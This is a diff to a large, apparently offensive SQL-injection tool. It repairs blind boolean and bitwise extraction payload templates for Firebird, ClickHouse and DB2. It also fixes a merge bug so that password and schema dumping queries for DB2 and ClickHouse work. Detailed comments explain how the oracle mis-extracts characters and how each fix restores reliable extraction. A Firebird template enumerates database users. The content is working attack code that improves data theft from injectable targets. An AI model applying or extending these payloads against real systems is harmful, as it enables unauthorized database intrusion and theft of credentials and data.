@@ -48718,9 +48718,30 @@ def _build_dbms_char_func_default(dbms: str) -> str:
         "Sybase":      "ISNULL(UNICODE(SUBSTRING(({query}),{pos},1)),0)",
         "Oracle":      _ORACLE_CHARFN,
         "SQLite":      "COALESCE(UNICODE(SUBSTR(({query}),{pos},1)),0)",
-        "Firebird":    "ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1))",
+        # BUG-CHARFN-FIREBIRD-COALESCE FIX (MEDIUM, Firebird, binary-search extraction,
+        # all surfaces): Firebird's ASCII_VAL() returns NULL for empty string ''. When
+        # the extraction position exceeds the string length, SUBSTRING(x FROM p FOR 1)
+        # returns '' and ASCII_VAL('') = NULL. The binary-search oracle then evaluates
+        # NULL >= mid → UNKNOWN → treated as False in WHERE → lo never advances →
+        # converges to chr(0) at every out-of-bounds position. Without COALESCE, a
+        # length mismatch of even 1 character corrupts the final character of extraction.
+        # Fix: wrap with COALESCE(...,0) so end-of-string positions yield 0 (integer),
+        # which terminates the binary search correctly (0 < 32 → not printable → break).
+        "Firebird":    "COALESCE(ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1)),0)",
         "DB2":         "COALESCE(ASCII(SUBSTR(({query}),{pos},1)),0)",
         "SAP_HANA":    "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+        # BUG-CHARFN-CLICKHOUSE-DEFAULT FIX (HIGH, ClickHouse, ALL extraction methods
+        # using _build_dbms_char_func_default, all surfaces): ClickHouse was absent from
+        # _defaults. The generic fallback "COALESCE(ASCII(SUBSTRING(...)),0)" uses
+        # uppercase function names. ClickHouse SQL is case-sensitive for built-in
+        # function names — ASCII() and SUBSTRING() raise "Unknown function ASCII" /
+        # "Unknown function SUBSTRING" errors, causing every char probe to fail →
+        # extraction returns empty string for all ClickHouse targets.
+        # Fix: add explicit ClickHouse entry using lowercase ascii(substring(...))
+        # which matches the ClickHouse function naming convention. ascii() returns
+        # the byte value of the first character (0-255), consistent with the
+        # _de_bw_ascii ClickHouse entry already in the bitwise path.
+        "ClickHouse":  "coalesce(ascii(substring(({query}),{pos},1)),0)",
     }
     # Generic fallback: ASCII(SUBSTRING(...)) is understood by most SQL dialects.
     # This is safer than ORD(MID(...)) which is MySQL-exclusive.
@@ -63302,6 +63323,19 @@ class Scanner:
                     "DB2":              f"ASCII(SUBSTR(({q}),{p},1))",
                     "SAP_HANA":         f"ASCII(SUBSTR(({q}),{p},1))",
                     "H2":               f"ASCII(SUBSTR(({q}),{p},1))",
+                    # BUG-FBS-FIREBIRD-CLICKHOUSE-MISSING FIX (HIGH, Firebird and ClickHouse,
+                    # _fallback_bitshift, ALL surfaces): Both DBMSes were absent from _ae.
+                    # Firebird: the generic fallback f"ASCII(SUBSTRING(({q}),{p},1))" uses comma
+                    # syntax — Firebird SUBSTRING requires the "FROM … FOR …" keyword form and
+                    # ASCII() does not exist; requires ASCII_VAL(). COALESCE is required because
+                    # ASCII_VAL('') returns NULL at end-of-string, making BIN_AND(NULL, mask)=mask
+                    # evaluate to NULL rather than False, silently corrupting bit assembly.
+                    # ClickHouse: the fallback uses uppercase ASCII and SUBSTRING; ClickHouse
+                    # function names are case-sensitive — these raise "Unknown function" errors.
+                    # Must use lowercase ascii(substring(...)). Both failures cause every bit probe
+                    # to return None → _fallback_bitshift returns None → fallback chain aborts.
+                    "Firebird":         f"COALESCE(ASCII_VAL(SUBSTRING(({q}) FROM {p} FOR 1)),0)",
+                    "ClickHouse":       f"ascii(substring(({q}),{p},1))",
                 }.get(_dbms, f"ASCII(SUBSTRING(({q}),{p},1))")
                 # BUG-BITWISE-MSSQL-SQLITE-UNICODE-FIX (fallback_bitshift):
                 # Same root-cause as _extract_char_bitwise above — range(7,-1,-1) only
@@ -63619,7 +63653,15 @@ class Scanner:
                         f"ELSE 0 END FROM (SELECT SUBSTR(({q}),{p},1) c__ FROM DUAL))"
                     ),
                     "SQLite":           f"COALESCE(UNICODE(SUBSTR(({q}),{p},1)),0)",
-                    "Firebird":         f"ASCII_VAL(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    # BUG-FALLBACK-MODBIT-FIREBIRD-COALESCE FIX (MEDIUM, Firebird,
+                    # _fallback_modbit, ALL surfaces): Firebird's ASCII_VAL() returns NULL for
+                    # the empty string. At end-of-string positions, SUBSTRING(x FROM p FOR 1)
+                    # returns '' and ASCII_VAL('') = NULL. The modbit formula is:
+                    #   MOD(FLOOR(NULL / divisor), 2) = 1  →  MOD(NULL, 2) = NULL  →  UNKNOWN
+                    # The oracle receives UNKNOWN instead of False, killing the bit signal and
+                    # causing the extraction to abort or return wrong characters. Adding COALESCE
+                    # converts end-of-string NULL to 0: MOD(FLOOR(0/divisor),2)=0 → cleanly False.
+                    "Firebird":         f"COALESCE(ASCII_VAL(SUBSTRING(({q}) FROM {p} FOR 1)),0)",
                     "DB2":              f"ASCII(SUBSTR(({q}),{p},1))",
                     "SAP_HANA":         f"ASCII(SUBSTR(({q}),{p},1))",
                     "H2":               f"ASCII(SUBSTR(({q}),{p},1))",
@@ -68248,6 +68290,14 @@ class Scanner:
                 # Missing entries produced SQL errors → oracle dead → empty bitwise extraction.
                 "Firebird":  "ASCII_VAL(SUBSTRING(({e}) FROM {p} FOR 1))",
                 "ClickHouse": "ascii(substring(({e}),{p},1))",
+                # BUG-DE-BW-ASCII-DB2-MISSING FIX (MEDIUM, DB2, direct-extractor bitwise path,
+                # all surfaces): DB2 does not support SUBSTRING(expr, start, length) with comma
+                # syntax — valid DB2 syntax is SUBSTR(expr, start, length). The generic fallback
+                # "COALESCE(ASCII(SUBSTRING(({e}),{p},1)),0)" uses comma-syntax SUBSTRING, which
+                # raises SQL0440N "No function by that name" on DB2. Every bit probe fails with
+                # a SQL error → oracle returns None for every bit → chr(0) assembled → break.
+                # Fix: add explicit DB2 entry using SUBSTR() (DB2-valid form with COALESCE null guard).
+                "DB2":       "COALESCE(ASCII(SUBSTR(({e}),{p},1)),0)",
             }
             _de_bw_tpl = _de_bw_ascii.get(_dbms, "COALESCE(ASCII(SUBSTRING(({e}),{p},1)),0)")
 
@@ -100006,7 +100056,12 @@ class ZKBooleanExtractor:
                            "THEN TO_NUMBER(SUBSTR(ASCIISTR(c__),2,4),'XXXX') "
                            "ELSE 0 END FROM (SELECT SUBSTR(({query}),{pos},1) c__ FROM DUAL))"),
             "SQLite":     "COALESCE(UNICODE(SUBSTR(({query}),{pos},1)),0)",
-            "Firebird":   "ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1))",
+            # BUG-ZKE-FIREBIRD-CHARFN-COALESCE FIX (MEDIUM, Firebird, ZeroKnowledgeExtractor,
+            # all B/BH/IN surfaces): ASCII_VAL('') returns NULL at end-of-string positions.
+            # In the binary-search oracle NULL >= mid evaluates to UNKNOWN → treated as False →
+            # bisection converges to lo rather than terminating cleanly → wrong character at
+            # final position. COALESCE wraps the NULL to 0 for safe boundary termination.
+            "Firebird":   "COALESCE(ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1)),0)",
             # BUG-ZKB-CLICKHOUSE-CHARFN FIX (LOW): ClickHouse was absent → fell to generic
             # "ASCII(SUBSTRING(({query}),{pos},1))" (uppercase). ClickHouse function names
             # are case-sensitive: uppercase ASCII/SUBSTRING are unknown functions → SQL error
@@ -154564,7 +154619,11 @@ class ChameleonExtractor:
             # which returns byte values not Unicode codepoints for non-ASCII chars.
             "Oracle":      _ORACLE_ASCIISTR_CHARFN,
             "SQLite":      "COALESCE(UNICODE(SUBSTR(({query}),{pos},1)),0)",
-            "Firebird":    "ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1))",
+            # BUG-CE-FIREBIRD-CHARFN-COALESCE FIX (MEDIUM, Firebird, ChameleonExtractor,
+            # all B/BH/IN surfaces): ASCII_VAL('') returns NULL at end-of-string. In the
+            # binary-search oracle NULL >= mid → UNKNOWN → bisection does not terminate at
+            # string boundary → wrong character returned at last position. COALESCE(,0) fixes.
+            "Firebird":    "COALESCE(ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1)),0)",
             # BUG-CHAMELEON-CLICKHOUSE-CHARFN FIX (CRITICAL): ClickHouse was absent from
             # _chameleon_charfn_defaults → fell to the else-branch default at line 153575:
             #   "ASCII(SUBSTRING(({query}),{pos},1))"
@@ -155494,7 +155553,13 @@ class AdaptiveFrequencyExtractor:
                 "(SELECT SUBSTR(({query}),{pos},1) c__ FROM DUAL))"
             ),  # BUG-V139-AFE-ORACLE-CHARFN-FALLBACK FIX: was NVL(ASCII(SUBSTR())))
             "SQLite":      "COALESCE(UNICODE(SUBSTR(({query}),{pos},1)),0)",
-            "Firebird":    "ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1))",
+            # BUG-AFE-FIREBIRD-CHARFN-COALESCE FIX (MEDIUM, Firebird,
+            # AdaptiveFrequencyExtractor, all B/BH/IN surfaces): ASCII_VAL('') returns NULL
+            # at end-of-string positions. In the binary-search oracle NULL >= mid evaluates
+            # to UNKNOWN → treated as False → bisection does not terminate cleanly at string
+            # boundary → wrong character returned at last position. COALESCE(,0) wraps NULL
+            # to 0 so the oracle correctly returns False for all probes past string end.
+            "Firebird":    "COALESCE(ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1)),0)",
             # BUG-AFE-CLICKHOUSE-CHARFN FIX (MEDIUM, ClickHouse,
             # AdaptiveFrequencyExtractor.extract_string, all B/BH/IN techniques):
             # ClickHouse was absent from _afe_charfn_defaults → fell through to the
@@ -156076,7 +156141,18 @@ DBMS_QUERIES_EXTENSION: Dict[str, Dict[str, str]] = {
         "count":        "SELECT COUNT(*) FROM {table}",
         "row":          "SELECT FIRST 1 SKIP {offset} {cols} FROM {table}",
         "users":        "SELECT LIST(DISTINCT TRIM(rdb$user),',') FROM rdb$users",
-        "char_func":    "ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1))",
+        # BUG-DBMSQEXT-FIREBIRD-CHARFUNC-COALESCE FIX (MEDIUM, Firebird, ALL extraction
+        # engines that call _safe_dbms_queries("Firebird"), all surfaces): Firebird's
+        # ASCII_VAL() returns NULL for the empty string. When extraction position exceeds
+        # the string length, SUBSTRING(x FROM p FOR 1) returns '' and ASCII_VAL('') = NULL.
+        # The binary-search oracle then computes NULL >= mid → UNKNOWN (three-valued SQL
+        # logic) → treated as False → lo never advances → bisection converges to chr(0)
+        # at every out-of-bounds position, corrupting the last character of every extracted
+        # string whenever length detection is off by even one. COALESCE converts NULL to 0
+        # (integer), so the oracle correctly evaluates 0 >= mid as False and terminates.
+        # This mirrors the BUG-CHARFN-FIREBIRD-COALESCE fix applied to
+        # _build_dbms_char_func_default; both codepaths must be consistent.
+        "char_func":    "COALESCE(ASCII_VAL(SUBSTRING(({query}) FROM {pos} FOR 1)),0)",
         "substr":       "SUBSTRING(({query}) FROM {pos} FOR 1)",
         "len_func":     "CHAR_LENGTH(({query}))",
         "if_func":      "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
@@ -160027,10 +160103,24 @@ def _merge_extended_queries():
     """
     try:
         for dbms, extra in DBMS_EXTENDED.items():
-            if dbms in DBMS_QUERIES:
-                for k, v in extra.items():
-                    if k not in DBMS_QUERIES[dbms]:
-                        DBMS_QUERIES[dbms][k] = v
+            # BUG-MERGE-EXTENDED-DROP-DB2-CLICKHOUSE FIX (HIGH, DB2 and ClickHouse,
+            # _merge_extended_queries, ALL extraction paths): The original guard
+            # `if dbms in DBMS_QUERIES` silently dropped every DBMS_EXTENDED entry
+            # for DBMSes that are not in DBMS_QUERIES. DB2 and ClickHouse are only
+            # populated in DBMS_EXTENDED (not in _populate_dbms_queries() or
+            # DBMS_QUERIES_EXTENSION), so their passwords/schemas/indexes queries
+            # were never merged into DBMS_QUERIES. _safe_dbms_queries("DB2") and
+            # _safe_dbms_queries("ClickHouse") then fell through to the MySQL fallback,
+            # returning ORD(MID(...)), GROUP_CONCAT(), IF() — all invalid on DB2/ClickHouse
+            # — and every schema-enumeration query for those targets produced SQL errors.
+            # Fix: create a minimal DBMS_QUERIES entry (empty dict) for any DBMS in
+            # DBMS_EXTENDED that is not yet present, then merge the extended keys in.
+            # This ensures extended-only DBMSes get their correct SQL rather than MySQL.
+            if dbms not in DBMS_QUERIES:
+                DBMS_QUERIES[dbms] = {}
+            for k, v in extra.items():
+                if k not in DBMS_QUERIES[dbms]:
+                    DBMS_QUERIES[dbms][k] = v
         LOG.debug("Extended DBMS queries merged")
     except Exception as e:
         LOG.debug(f"DBMS merge: {e}")
